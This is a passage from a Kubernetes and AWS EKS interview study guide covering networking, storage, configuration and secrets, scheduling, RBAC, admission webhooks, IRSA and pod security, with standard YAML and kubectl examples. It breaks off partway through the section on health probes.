💡 **ndots:5 issue:** Default ndots=5 means any name with fewer than 5 dots gets ALL search domains appended before trying as FQDN. `api.stripe.com` (2 dots) → tries 4 search domain permutations first → 5 DNS queries instead of 1. Fix: use FQDN with trailing dot (`api.stripe.com.`) or reduce ndots in dnsConfig.

💡 **CoreDNS is a single point of failure** — if CoreDNS dies, all DNS resolution stops. Run 2+ replicas with PDB and monitor its resource usage.

---

## ⚠️ 3.4 Ingress (AWS ALB Focus)

### Concept

Ingress exposes HTTP/HTTPS routes from outside the cluster to services inside the cluster. It provides host-based and path-based routing, TLS termination, and more.

### AWS ALB Ingress Controller

On EKS, the **AWS Load Balancer Controller** provisions ALBs for Ingress resources and NLBs for LoadBalancer Services.

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: app-ingress
  namespace: production
  annotations:
    kubernetes.io/ingress.class: alb
    alb.ingress.kubernetes.io/scheme: internet-facing
    alb.ingress.kubernetes.io/target-type: ip        # pod IPs directly (VPC CNI)
    alb.ingress.kubernetes.io/certificate-arn: arn:aws:acm:...  # ACM cert
    alb.ingress.kubernetes.io/listen-ports: '[{"HTTPS":443}]'

```

### Important Details

🔧 **target-type: ip** (recommended on EKS) — ALB sends traffic directly to pod IPs (bypasses NodePort). Requires VPC CNI.

🔧 **group.name** — multiple Ingress resources can share one ALB, reducing costs. Each Ingress adds rules to the shared ALB.

🔧 **ACM certificate** — use AWS Certificate Manager for free, auto-renewing TLS certificates.

### Interview Insights

💡 **Ingress vs LoadBalancer Service:** Ingress provides L7 (HTTP) routing — host/path-based routing, TLS termination, multiple services behind one LB. LoadBalancer Service is L4 (TCP) — one service per LB. Use Ingress for HTTP APIs, LoadBalancer for TCP services (databases, gRPC).

---

## ⚠️ 3.5 Network Policies

### Concept

Network Policies are Kubernetes-native **firewalls** that control pod-to-pod and pod-to-external traffic at L3/L4 (IP/port level). By default, all pods can talk to all pods — Network Policies restrict this.

### How It Works

```
DEFAULT: All traffic allowed (no Network Policies)

ONCE ANY POLICY SELECTS A POD:
  That pod's traffic is DENIED by default for the policy's direction
  Only traffic explicitly allowed by the policy is permitted
  This is "default deny" for selected pods
```

### Production Example

```yaml
# Default deny all ingress in namespace
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-ingress
  namespace: production
spec:
  podSelector: {}         # selects ALL pods in namespace
  policyTypes:
  - Ingress               # deny all incoming traffic by default

---
# Allow specific traffic
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-api-to-db
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: database
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: api          # only api pods can reach database
    ports:
    - protocol: TCP
      port: 5432            # only on postgres port

---
# Allow DNS (critical — without this, pods can't resolve names)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector: {}
      podSelector:
        matchLabels:
          k8s-app: kube-dns
    ports:
    - protocol: UDP
      port: 53
    - protocol: TCP
      port: 53
```

### Important Details

⚠️ **Network Policies require a CNI that supports them.** Flannel does NOT support Network Policies. Calico, Cilium, and AWS VPC CNI with Calico support do.

⚠️ **Don't forget DNS egress.** Default-deny egress without allowing DNS port 53 → all DNS resolution breaks → all service communication breaks.

### Interview Insights

💡 **Best practice:** Start with default-deny in each namespace, then explicitly allow required traffic paths. This is the microsegmentation approach.

---

## ⚠️ 3.6 kube-proxy Modes

### iptables vs IPVS

```
iptables (default):
  O(n) rule lookup — every packet traverses ALL rules
  At 10,000 services: tens of thousands of rules
  Probabilistic load balancing (not true round-robin)

IPVS (recommended for large clusters):
  O(1) hash table lookup
  True LB algorithms: round-robin, least-connections, source-hash
  Enable: edit kube-proxy ConfigMap, set mode: "ipvs"

eBPF via Cilium:
  Replaces kube-proxy entirely
  Best performance, best observability
  Increasingly common in production
```

### Interview Insights

💡 **When to switch to IPVS?** Clusters with 1,000+ services. Below that, iptables is fine. Cilium eBPF is the best option if you're starting fresh.

---

## 3.7 Headless Services

### Concept

Headless service (`clusterIP: None`) returns **all pod IPs** in DNS response instead of a single virtual IP. No kube-proxy rules are created.

```
Normal Service DNS:    api-service → 10.96.45.23 (single ClusterIP)
Headless Service DNS:  api-service → 10.244.1.5, 10.244.2.3, 10.244.3.7 (ALL pod IPs)
```

### Use Cases

- StatefulSets — stable per-pod DNS (`mysql-0.mysql-headless.ns.svc.cluster.local`)
- Peer discovery — Kafka brokers, Cassandra nodes need all addresses
- Client-side load balancing — gRPC clients that manage their own connections

---

## 3.8 CNI Plugins

### Concept

CNI (Container Network Interface) plugins implement the Kubernetes networking model. They allocate pod IPs and set up the network plumbing.

```
AWS VPC CNI (EKS default):
  Assigns real VPC IPs to pods via secondary ENI IP addresses
  No overlay network — direct VPC routing
  Advantage: native VPC integration, security groups
  Challenge: IP address exhaustion — plan CIDR space
  Use prefix delegation for higher pod density

Calico:
  BGP-based routing or VXLAN overlay
  Strong Network Policy support (L3/L4)
  Popular for on-prem and multi-cloud

Cilium:
  eBPF-based — runs programs in Linux kernel
  Replaces kube-proxy
  L3/L4/L7 Network Policies
  Best observability (Hubble)
  Growing EKS adoption
```

---

# 4. STORAGE

---

## 4.1 Volumes

### Concept

Containers have **ephemeral filesystems** — data lost when container restarts. Volumes provide persistent or shared storage that outlives the container.

### Common Volume Types

```
emptyDir:     Created when pod starts, deleted when pod ends.
              Shared between containers in same pod.
              Use for: scratch space, inter-container data sharing.

hostPath:     Mounts a directory from the node filesystem.
              Use for: node-level monitoring, DaemonSet needs.
              ⚠️ Security risk — access to host filesystem.

configMap:    Mounts ConfigMap keys as files.
secret:       Mounts Secret keys as files (tmpfs — in-memory).

persistentVolumeClaim: Mounts a PVC-bound persistent volume.
              Use for: databases, stateful apps.

projected:    Combines multiple sources (SA token, ConfigMap, Secret)
              into a single volume mount.
```

---

## 4.2 PV / PVC

### Concept

**PersistentVolume (PV):** A cluster-level storage resource (like a cloud disk). Provisioned by admin or dynamically.

**PersistentVolumeClaim (PVC):** A user's request for storage. Binds to a PV.

```
PVC (user request)  ←→  PV (actual storage)  ←→  Cloud disk (EBS volume)

Lifecycle:
  PVC created → controller finds matching PV → BOUND
  PVC deleted → reclaim policy determines PV fate:
    Retain → PV kept, data preserved, manual cleanup
    Delete → PV and cloud disk deleted automatically
```

### Access Modes

```
ReadWriteOnce (RWO):  Single node read-write. Most common for EBS.
ReadOnlyMany (ROX):   Many nodes read-only.
ReadWriteMany (RWX):  Many nodes read-write. Requires EFS on AWS.

⚠️ EBS is RWO only — one node at a time.
   For RWX use EFS (NFS) or FSx for Lustre.
```

---

## 4.3 StorageClass

### Concept

StorageClass defines **how** storage is provisioned — which provisioner, what type, what parameters. Enables dynamic provisioning — PVCs automatically create PVs.

```yaml
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
  name: gp3
  annotations:
    storageclass.kubernetes.io/is-default-class: "true"
provisioner: ebs.csi.aws.com
parameters:
  type: gp3
  encrypted: "true"
  fsType: ext4
reclaimPolicy: Retain          # keep data on PVC deletion
volumeBindingMode: WaitForFirstConsumer  # bind when pod schedules
allowVolumeExpansion: true     # allow PVC resize
```

### Important Details

🔧 **WaitForFirstConsumer** (recommended) — delays PV creation until a pod using the PVC is scheduled. Ensures the EBS volume is created in the same AZ as the node. Without this, PV might be in a different AZ than the pod → scheduling failure.

🔧 **reclaimPolicy: Retain** — production databases should ALWAYS use Retain. Default for dynamic provisioning is Delete (dangerous).

🔧 **allowVolumeExpansion: true** — enables online PVC resize. EBS CSI driver supports expanding without pod restart.

---

## ⚠️ 4.4 Dynamic Provisioning

### How It Works

```
DYNAMIC PROVISIONING FLOW:
  1. User creates PVC referencing StorageClass "gp3"
  2. PVC controller sees no matching PV exists
  3. CSI external-provisioner calls CSI Controller: CreateVolume
  4. CSI Controller calls AWS API: ec2.CreateVolume(type=gp3, size=100Gi, az=us-east-1a)
  5. AWS creates EBS volume → vol-0abc123
  6. CSI controller creates PV object pointing to vol-0abc123
  7. PV bound to PVC → status: Bound
  8. Pod starts → kubelet calls CSI Node plugin:
     NodeStageVolume (format) → NodePublishVolume (bind-mount to pod)
  9. Container sees filesystem at mountPath
```

### Interview Insights

💡 **Static vs Dynamic provisioning:** Static = admin pre-creates PVs, user binds PVCs. Dynamic = PVC auto-creates PV via StorageClass. Dynamic is the standard for cloud environments.

💡 **AZ mismatch is a common issue:** EBS is AZ-bound. If PV is in us-east-1a but pod schedules to us-east-1b → pod stuck Pending. Use `volumeBindingMode: WaitForFirstConsumer` to prevent this.

---

## 4.5 CSI (Container Storage Interface)

### Concept

CSI standardized storage drivers as out-of-tree plugins. Two components:

```
Controller Plugin (Deployment, 1-2 replicas):
  Cloud-level operations: CreateVolume, DeleteVolume, AttachVolume, Snapshot
  Has cloud credentials (IRSA on EKS)

Node Plugin (DaemonSet, every node):
  Node-level operations: NodeStageVolume (format), NodePublishVolume (bind-mount)
  Needs privileged: true and host /dev access
```

### AWS EBS CSI Driver on EKS

```bash
# Install via EKS addon
aws eks create-addon \
  --cluster-name my-cluster \
  --addon-name aws-ebs-csi-driver \
  --service-account-role-arn arn:aws:iam::123456789012:role/EBS-CSI-Role

# The IRSA role needs permissions:
# ec2:CreateVolume, ec2:DeleteVolume, ec2:AttachVolume,
# ec2:DetachVolume, ec2:CreateSnapshot, ec2:ModifyVolume
```

---

# 5. CONFIG & SECRETS

---

## 5.1 ConfigMaps

### Concept

ConfigMaps store **non-confidential configuration data** as key-value pairs. Decouple configuration from container images.

### Two Injection Methods

```yaml
# Method 1: Environment variables
env:
- name: LOG_LEVEL
  valueFrom:
    configMapKeyRef:
      name: app-config
      key: log-level

# Method 2: Volume mount (files)
volumeMounts:
- name: config
  mountPath: /etc/myapp
volumes:
- name: config
  configMap:
    name: app-config
```

### Important Details

- **Env vars are NOT updated when ConfigMap changes.** Pod restart required.
- **Volume mounts ARE updated** (~60 seconds delay). App must re-read files.
- ConfigMaps have a **1MB size limit** in etcd.

---

## ⚠️ 5.2 Secrets

### Concept

Secrets store sensitive data (passwords, tokens, certificates). Structurally similar to ConfigMaps but with additional protections.

### How Secrets Work

```
Secrets are base64-encoded (NOT encrypted by default).
Anyone with API access can decode them.

Protection layers:
  1. RBAC — restrict who can read secrets
  2. Encryption at rest — configure EncryptionConfiguration
     with KMS provider (AWS KMS on EKS)
  3. etcd access control — only API server reads etcd
  4. Secrets mounted as tmpfs — never written to disk on node
```

```yaml
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
type: Opaque
data:
  username: YWRtaW4=           # base64 of "admin"
  password: cGFzc3dvcmQxMjM=   # base64 of "password123"
# OR use stringData (auto-encoded):
stringData:
  username: admin
  password: password123
```

### Secret Encryption at Rest (EKS)

```yaml
# EKS supports envelope encryption with AWS KMS
# Enable via EKS console or:
aws eks associate-encryption-config \
  --cluster-name my-cluster \
  --encryption-config '[{
    "resources": ["secrets"],
    "provider": {
      "keyArn": "arn:aws:kms:us-east-1:123456789012:key/abc-123"
    }
  }]'
```

### Interview Insights

💡 **base64 is NOT encryption.** Secrets are only base64-encoded by default. Always enable encryption at rest via KMS.

💡 **Env vars vs volume mounts for secrets:** Volume mounts update when secret changes (~60s). Env vars do NOT — require pod restart.

---

## ⚠️ 5.3 External Secrets (AWS Secrets Manager)

### Concept

External Secrets Operator (ESO) syncs secrets from external providers (AWS Secrets Manager, Parameter Store, Vault) into Kubernetes Secrets automatically.

```
Flow: AWS Secrets Manager → ESO Controller → Kubernetes Secret → Pod

Why: Store secrets in one place (AWS SM), automatically available in K8s.
     No manual kubectl create secret.
     Rotation in AWS SM → ESO syncs → K8s Secret updated.
```

### Production YAML

```yaml
# ClusterSecretStore — cluster-wide access to AWS SM
apiVersion: external-secrets.io/v1beta1
kind: ClusterSecretStore
metadata:
  name: aws-secrets-manager
spec:
  provider:
    aws:
      service: SecretsManager
      region: us-east-1
      auth:
        jwt:
          serviceAccountRef:
            name: external-secrets-sa
            namespace: external-secrets

---
# ExternalSecret — sync specific secret
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: db-credentials
  namespace: production
spec:
  refreshInterval: 1h           # check AWS SM every hour
  secretStoreRef:
    name: aws-secrets-manager
    kind: ClusterSecretStore
  target:
    name: db-credentials        # K8s Secret name
    creationPolicy: Owner
  data:
  - secretKey: password         # key in K8s Secret
    remoteRef:
      key: prod/database/credentials  # AWS SM secret name
      property: password              # JSON property
  - secretKey: username
    remoteRef:
      key: prod/database/credentials
      property: username
```

### Interview Insights

💡 **ESO vs CSI Secret Store Driver:** ESO creates a K8s Secret in etcd (synced periodically). CSI mounts secrets directly as tmpfs at pod start time (never in etcd). Use ESO for env var injection; CSI for compliance requiring secrets never touch etcd.

---

## 5.4 Projected Volumes & Secret Encryption

### Projected Volumes

Combine multiple sources into a single volume mount:

```yaml
volumes:
- name: combined
  projected:
    sources:
    - serviceAccountToken:
        audience: sts.amazonaws.com
        expirationSeconds: 3600
        path: token
    - configMap:
        name: app-config
        items:
        - key: config.yaml
          path: config.yaml
    - secret:
        name: app-secrets
        items:
        - key: tls.crt
          path: tls.crt
```

Used by IRSA — projects a short-lived, audience-scoped SA token for AWS API authentication.

---

# 6. SCHEDULING & RESOURCES

---

## ⚠️ 6.1 Requests vs Limits

### Concept

**Requests:** The minimum resources guaranteed to a container. Used by the scheduler for placement decisions.

**Limits:** The maximum resources a container can use. Enforced by the kernel via cgroups.

```
REQUESTS vs LIMITS — BEHAVIOR MATRIX:
═══════════════════════════════════════════════════════════════

CPU:
  Request:  Guaranteed CPU time via CFS shares
  Limit:    Hard throttling — container's CPU usage is capped
  Over-limit: Container is THROTTLED (not killed)
  No limit:   Container can use all available CPU on node

Memory:
  Request:  Used for scheduling and QoS classification
  Limit:    Hard cap enforced by Linux OOM killer
  Over-limit: Container is OOM KILLED (exit code 137)
  No limit:   Container can consume all node memory → node instability

BEST PRACTICE FOR PRODUCTION:
  Always set requests (for scheduling accuracy)
  Always set memory limits (prevent OOM impact on other pods)
  CPU limits are debated:
    With limit:    prevents noisy neighbor, but causes throttling
    Without limit: better performance, risk of CPU starvation
  Modern recommendation: set CPU requests, consider NOT setting CPU limits
```

```yaml
resources:
  requests:
    cpu: "250m"        # 0.25 CPU cores guaranteed
    memory: "256Mi"    # 256 MiB guaranteed
  limits:
    cpu: "500m"        # throttled above 0.5 cores
    memory: "512Mi"    # OOM killed above 512 MiB
```

### Interview Insights

💡 **CPU throttling is invisible.** Container doesn't crash — it just runs slower. Check `container_cpu_cfs_throttled_periods_total` in Prometheus. High throttling = CPU limit too low.

💡 **Exit code 137 = OOMKilled.** 128 + 9 (SIGKILL). Increase memory limit or fix the memory leak.

💡 **Scheduler uses requests, not limits.** A node with 4 CPU cores and pods requesting 3.5 cores total can schedule. Even if limits sum to 10 cores — that's overcommit, handled by kernel throttling/OOM.

---

## 6.2 Namespaces

### Concept

Namespaces provide **logical isolation** within a cluster — separate environments, teams, or applications. Not security boundaries on their own (need RBAC + NetworkPolicies).

```bash
kubectl get namespaces
# NAME              STATUS   AGE
# default           Active   30d
# kube-system       Active   30d    # control plane components
# kube-public       Active   30d    # publicly readable resources
# kube-node-lease   Active   30d    # node heartbeat leases
# production        Active   25d
# staging           Active   25d
```

---

## 6.3 ResourceQuota

### Concept

ResourceQuota limits the **total resources** a namespace can consume — prevents one team from consuming all cluster resources.

```yaml
apiVersion: v1
kind: ResourceQuota
metadata:
  name: production-quota
  namespace: production
spec:
  hard:
    requests.cpu: "20"
    requests.memory: "40Gi"
    limits.cpu: "40"
    limits.memory: "80Gi"
    pods: "100"
    services.loadbalancers: "5"
    persistentvolumeclaims: "20"
    requests.storage: "500Gi"
```

### Important Details

⚠️ When a ResourceQuota exists in a namespace, **all pods must specify resource requests/limits** for the quota'd resources. Pods without requests/limits are rejected. Use LimitRange to set defaults.

---

## ⚠️ 6.4 QoS Classes

### Concept

Kubernetes assigns a **Quality of Service class** to every pod based on its resource configuration. QoS determines **eviction priority** under node pressure.

```
GUARANTEED:
  Every container has requests AND limits set
  requests == limits (for both CPU and memory)
  Last to be evicted. Highest priority.

BURSTABLE:
  At least one container has requests OR limits set
  requests != limits (or only one is set)
  Evicted after BestEffort, before Guaranteed.

BESTEFFORT:
  No container has any requests or limits
  First to be evicted under pressure.
  Never use in production.

EVICTION ORDER UNDER MEMORY PRESSURE:
  1. BestEffort pods evicted first
  2. Burstable pods exceeding their requests evicted next
  3. Guaranteed pods evicted last (only if node is critically low)
```

### Interview Insights

💡 **Production pods should be Guaranteed or Burstable.** BestEffort pods are first to die under pressure. Critical services should be Guaranteed (requests == limits).

💡 **Burstable pods exceeding their requests are evicted before those within requests.** The more you exceed your request, the higher your eviction priority.

---

## 6.5 Node Affinity

### Concept

Node affinity constrains which nodes a pod can schedule on, based on node labels. More expressive than nodeSelector.

```yaml
spec:
  affinity:
    nodeAffinity:
      # HARD rule — pod will NOT schedule if unsatisfied
      requiredDuringSchedulingIgnoredDuringExecution:
        nodeSelectorTerms:
        - matchExpressions:
          - key: topology.kubernetes.io/zone
            operator: In
            values: [us-east-1a, us-east-1b]
      # SOFT rule — scheduler prefers but doesn't require
      preferredDuringSchedulingIgnoredDuringExecution:
      - weight: 80
        preference:
          matchExpressions:
          - key: node.kubernetes.io/instance-type
            operator: In
            values: [m5.xlarge, m5.2xlarge]
```

---

## ⚠️ 6.6 Pod Affinity & Anti-Affinity

### Concept

Pod affinity/anti-affinity controls scheduling relative to **other pods**, not nodes.

```yaml
spec:
  affinity:
    # Pod ANTI-AFFINITY — spread pods across nodes/zones
    podAntiAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
      - labelSelector:
          matchExpressions:
          - key: app
            operator: In
            values: [api]
        topologyKey: kubernetes.io/hostname    # one per node
    # Pod AFFINITY — co-locate with other pods
    podAffinity:
      preferredDuringSchedulingIgnoredDuringExecution:
      - weight: 100
        podAffinityTerm:
          labelSelector:
            matchLabels:
              app: cache
          topologyKey: kubernetes.io/hostname  # same node as cache
```

### Interview Insights

💡 **Anti-affinity across zones** — use `topologyKey: topology.kubernetes.io/zone` to spread pods across AZs for HA.

💡 **Anti-affinity can cause scheduling failures** — with hard anti-affinity and more replicas than nodes, some pods will be Pending.

---

## ⚠️ 6.7 Taints & Tolerations

### Concept

**Taints** on nodes repel pods. **Tolerations** on pods allow them to schedule on tainted nodes.

```bash
# Taint a node
kubectl taint nodes node1 env=prod:NoSchedule

# Three taint effects:
# NoSchedule    — new pods without toleration won't schedule
# PreferNoSchedule — tries to avoid, but will schedule if necessary
# NoExecute     — evicts EXISTING pods too (if no toleration)
```

```yaml
# Toleration on pod — allows scheduling on tainted node
spec:
  tolerations:
  - key: "env"
    operator: "Equal"
    value: "prod"
    effect: "NoSchedule"
  # Tolerate ALL taints (DaemonSet pattern):
  - operator: "Exists"
```

### Common EKS Taint Patterns

```
GPU nodes:    taint nvidia.com/gpu=present:NoSchedule
              Only GPU workloads tolerate → reserve GPU nodes
Spot nodes:   taint kubernetes.io/lifecycle=spot:NoSchedule
              Only fault-tolerant workloads on spot
Dedicated:    taint team=data-science:NoSchedule
              Reserve node group for specific team
```

### Interview Insights

💡 **Taints repel, tolerations allow.** Toleration does NOT guarantee scheduling on the tainted node — it just permits it. Use nodeAffinity to ATTRACT pods to specific nodes.

💡 **NoExecute evicts running pods.** If you add a NoExecute taint to a node, all pods without a matching toleration are evicted immediately (or after tolerationSeconds).

---

## ⚠️ 6.8 Topology Spread Constraints

### Concept

Topology spread ensures pods are **evenly distributed** across failure domains (zones, nodes).

```yaml
spec:
  topologySpreadConstraints:
  - maxSkew: 1                              # max imbalance between domains
    topologyKey: topology.kubernetes.io/zone  # spread across AZs
    whenUnsatisfiable: DoNotSchedule          # hard constraint
    labelSelector:
      matchLabels:
        app: api
  - maxSkew: 1
    topologyKey: kubernetes.io/hostname       # also spread across nodes
    whenUnsatisfiable: ScheduleAnyway         # soft constraint
    labelSelector:
      matchLabels:
        app: api
```

### Interview Insights

💡 **maxSkew=1 across zones** means: the difference in pod count between any two zones is at most 1. With 6 pods and 3 zones: 2-2-2 is ideal. 3-2-1 violates maxSkew=1.

💡 **whenUnsatisfiable: DoNotSchedule** — pod stays Pending if constraint can't be met. **ScheduleAnyway** — best-effort, may place unevenly.

💡 **Topology spread + pod anti-affinity** — use topology spread for balanced distribution, anti-affinity for strict "no two pods on same node."

---

## 6.9 Priority Classes

### Concept

PriorityClasses determine **which pods get evicted first** when the cluster runs out of resources. Higher priority pods can preempt (evict) lower priority ones.

```yaml
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: high-priority
value: 1000000
preemptionPolicy: PreemptLowerPriority
globalDefault: false
description: "Critical production services"

---
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: low-priority
value: 100
preemptionPolicy: Never    # don't evict others, just get evicted first
```

```
Built-in priority classes:
  system-cluster-critical:  2000000000 (etcd, API server)
  system-node-critical:     2000001000 (kubelet-managed, kube-proxy)
```

# 7. SECURITY

## ⚠️ 7.1 RBAC

### Concept

RBAC (Role-Based Access Control) controls **who can do what** in the cluster. It matches identities (users, groups, service accounts) to permissions (verbs on resources).

### Four RBAC Objects

```
Role:              permissions within ONE namespace
ClusterRole:       permissions cluster-wide (all namespaces)
RoleBinding:       binds Role/ClusterRole to subjects in ONE namespace
ClusterRoleBinding: binds ClusterRole to subjects cluster-wide
```

### Production Examples

```yaml
# Role: allow reading pods in production namespace
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-reader
  namespace: production
rules:
- apiGroups: [""]           # core API group
  resources: ["pods"]
  verbs: ["get", "list", "watch"]
- apiGroups: [""]
  resources: ["pods/log"]
  verbs: ["get"]

---
# RoleBinding: grant pod-reader to a group
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: dev-pod-reader
  namespace: production
subjects:
- kind: Group
  name: developers
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: pod-reader
  apiGroup: rbac.authorization.k8s.io

---
# ClusterRole: cluster-wide admin
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: namespace-admin
rules:
- apiGroups: ["", "apps", "batch"]
  resources: ["*"]
  verbs: ["*"]
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "list"]       # read but not create/delete secrets
```

### Debugging RBAC

```bash
# Check if a user/SA has permission
kubectl auth can-i create deployments --namespace production
kubectl auth can-i create deployments --namespace production --as=system:serviceaccount:production:myapp-sa
kubectl auth can-i '*' '*' --as=admin-user    # check for cluster-admin

# List all roles/bindings
kubectl get roles,rolebindings -n production
kubectl get clusterroles,clusterrolebindings

# Who can do what (requires rakkess or manual inspection)
kubectl auth can-i --list --namespace production --as=developer
```

### Interview Insights

💡 **Principle of least privilege:** Start with no permissions, add only what's needed. Never use `cluster-admin` for application service accounts.

💡 **Common RBAC mistake:** Creating a ClusterRoleBinding when a RoleBinding was intended → accidentally grants permissions across ALL namespaces.

---

## 7.2 Service Accounts

### Concept

Service Accounts provide identity for **pods** (not humans). Every pod runs as a service account, and RBAC rules are applied to that SA.

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: myapp-sa
  namespace: production
  annotations:
    eks.amazonaws.com/role-arn: arn:aws:iam::123456789012:role/MyAppRole  # IRSA

---
# Pod using the service account
spec:
  serviceAccountName: myapp-sa
  automountServiceAccountToken: false  # disable if not needed (security)
```

### Important Details

- Every namespace has a `default` service account. Pods use it if none specified.
- **automountServiceAccountToken: false** — disable token mounting if the pod doesn't need K8s API access. Reduces attack surface.
- SA tokens are projected volumes with short-lived, audience-scoped JWTs (bound service account tokens).

---

## ⚠️ 7.3 Admission Controllers

### Concept

Admission controllers intercept API requests **after authentication and authorization** but **before persistence to etcd**. They can mutate objects, validate them, or reject requests.

### Types

```
Mutating Admission:
  Modifies the object before it's stored
  Examples: inject sidecar, add default labels, set resource defaults
  Runs FIRST

Validating Admission:
  Approves or rejects the object
  Examples: OPA/Gatekeeper policy, Kyverno rules, image whitelist
  Runs SECOND (after mutation)
```

### Built-in Admission Controllers

```
NamespaceLifecycle    — prevents operations in terminating namespaces
LimitRanger           — enforces LimitRange defaults and constraints
ResourceQuota         — enforces namespace resource quotas
NodeRestriction       — limits kubelet to only modify its own node
MutatingAdmissionWebhook   — calls external webhook for mutation
ValidatingAdmissionWebhook — calls external webhook for validation
```

---

## ⚠️ 7.4 Webhooks (Mutating & Validating)

### Concept

Webhooks extend admission control by calling **external HTTP endpoints** to mutate or validate API requests.

```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: policy-validation
webhooks:
- name: validate.policy.example.com
  clientConfig:
    service:
      name: policy-webhook
      namespace: policy-system
      path: /validate
    caBundle: <base64-ca-cert>
  rules:
  - operations: ["CREATE", "UPDATE"]
    apiGroups: ["apps"]
    apiVersions: ["v1"]
    resources: ["deployments"]
  failurePolicy: Fail       # Fail or Ignore
  timeoutSeconds: 10
  sideEffects: None
```

### Important Details

⚠️ **failurePolicy: Fail** — if webhook is down, ALL matching API requests are rejected. Can lock the entire cluster if the webhook pod can't start (circular dependency).

🔧 **failurePolicy: Ignore** — if webhook is down, requests proceed without validation. Use during initial rollout, switch to Fail once stable.

⚠️ **Webhook timeout** — max 30 seconds. If webhook is slow, API requests queue up and the cluster becomes unresponsive.

### Interview Insights

💡 **Common incident pattern:** Webhook pod crashes → failurePolicy: Fail → can't create any pods (including webhook replacement) → cluster deadlock. Fix: temporarily patch failurePolicy to Ignore, fix webhook, restore to Fail.

---

## ⚠️ 7.5 IRSA (IAM Roles for Service Accounts)

### Concept

IRSA eliminates static AWS credentials from pods. Uses OIDC federation to let pods assume IAM roles via their Kubernetes Service Account.

### How It Works

```
IRSA FLOW:
  1. EKS cluster has OIDC issuer URL
  2. IAM role trust policy: "allow SA 'myapp-sa' in namespace 'production' to assume this role"
  3. SA annotated with IAM role ARN
  4. Pod starts → mutating webhook injects:
     - AWS_ROLE_ARN env var
     - AWS_WEB_IDENTITY_TOKEN_FILE path (projected SA token)
  5. AWS SDK reads token, calls STS AssumeRoleWithWebIdentity
  6. STS validates token against EKS OIDC provider
  7. STS returns temporary credentials (expire in 1-24h)
  8. Pod uses temporary credentials — no static keys
```

```yaml
# ServiceAccount with IRSA
apiVersion: v1
kind: ServiceAccount
metadata:
  name: myapp-sa
  namespace: production
  annotations:
    eks.amazonaws.com/role-arn: arn:aws:iam::123456789012:role/MyAppIAMRole
```

```bash
# Verify IRSA working inside pod
kubectl exec -it myapp -n production -- aws sts get-caller-identity
# Shows assumed role ARN → IRSA working

# Create with eksctl
eksctl create iamserviceaccount \
  --name myapp-sa \
  --namespace production \
  --cluster my-cluster \
  --attach-policy-arn arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess \
  --approve
```

### Interview Insights

💡 **IRSA vs EC2 instance role:** Instance role gives ALL pods on the node the same AWS permissions. IRSA gives per-pod, per-service-account permissions. Always prefer IRSA.

💡 **Trust policy scoping:** The IAM trust policy must specify BOTH the namespace AND service account name. A misconfigured trust policy with broad scope is a security risk.

---

## 7.6 Pod Security

### Concept

Pod Security Standards define three levels of security for pods:

```
Privileged:  No restrictions. For system-level workloads.
Baseline:    Prevents known privilege escalations. Good default.
Restricted:  Hardened. No root, no privilege escalation, read-only root filesystem.
```

```yaml
# Enforce at namespace level via labels
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

### Secure Pod Template

```yaml
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
```

---

## 7.7 OPA/Gatekeeper

### Concept

OPA (Open Policy Agent) Gatekeeper enforces custom policies as validating admission webhooks using the Rego policy language.

```yaml
# ConstraintTemplate — defines the policy logic
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiredlabels
spec:
  crd:
    spec:
      names:
        kind: K8sRequiredLabels
      validation:
        openAPIV3Schema:
          properties:
            labels:
              type: array
              items:
                type: string
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8srequiredlabels
      violation[{"msg": msg}] {
        provided := {label | input.review.object.metadata.labels[label]}
        required := {label | label := input.parameters.labels[_]}
        missing := required - provided
        count(missing) > 0
        msg := sprintf("Missing required labels: %v", [missing])
      }

---
# Constraint — applies the policy
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredLabels
metadata:
  name: require-team-label
spec:
  match:
    kinds:
    - apiGroups: ["apps"]
      kinds: ["Deployment"]
    namespaces: ["production"]
  parameters:
    labels: ["team", "cost-center"]
```

# 8. OBSERVABILITY

---

## 8.1 Probes

### Concept

Probes let kubelet check container health. Three types with distinct purposes:

```
LIVENESS PROBE:
  Question: "Is the container alive?"
  Failure:  Container is KILLED and RESTARTED
  Use for:  Detecting deadlocks, hung processes
  ⚠️ Don't check dependencies — only check if the process itself is alive

READINESS PROBE:
  Question: "Is the container ready to serve traffic?"
  Failure:  Pod removed from Service endpoints (NO traffic)
            Container is NOT restarted
  Use for:  Warm-up time, dependency health, temporary overload

STARTUP PROBE:
  Question: "Has the app finished starting?"
  Failure:  Container is killed (same as liveness)
  Success:  Enables liveness and readiness probes
